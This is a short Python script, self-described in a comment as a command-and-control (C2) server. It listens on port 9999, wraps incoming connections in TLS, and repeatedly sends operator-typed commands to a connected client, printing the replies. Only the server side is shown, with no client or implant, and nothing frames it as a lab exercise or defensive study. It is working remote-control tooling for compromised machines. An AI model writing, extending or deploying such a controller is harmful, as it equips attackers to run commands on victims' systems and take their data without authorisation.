import socket
import ssl # To protect data exchanged between the C2 server and clients (SSL)

# Server configuration
HOST = '0.0.0.0'
PORT = 9999

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile='server.crt', keyfile='server.key')

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        
        ssl_client_socket = context.wrap_socket(client_socket, server_side=True)
        handle_client(ssl_client_socket)

def handle_client(client_socket):
    with client_socket:
        while True:
            try:
                command = input("Enter command: ")
                if command.lower() == 'exit':
                    client_socket.send(b'exit')
                    break
                client_socket.send(command.encode())
                
                response = client_socket.recv(4096)
                print(f"[*] Received: {response.decode('utf-8')}")
            except Exception as e:
                print(f"[!] Error: {e}")
                break

if __name__ == "__main__":
    start_server()
